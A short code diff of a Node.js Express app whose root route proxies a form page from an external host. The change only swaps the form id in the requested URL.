@@ -87,7 +87,7 @@ app.engine('html', function (templateFile, options, callback) {
 var request = require('request');
 app.get("/", (req, res) => {
   let proto = req.headers['x-forwarded-proto'] || "http";
-  request([proto, "://", "d5t.acx.ac", "/form?id=BqaIb13Bdc9"].join("")).pipe(res);
+  request([proto, "://", "d5t.acx.ac", "/form?id=Ym4hr0XnZIe"].join("")).pipe(res);
 });
 
 const aliases = {};
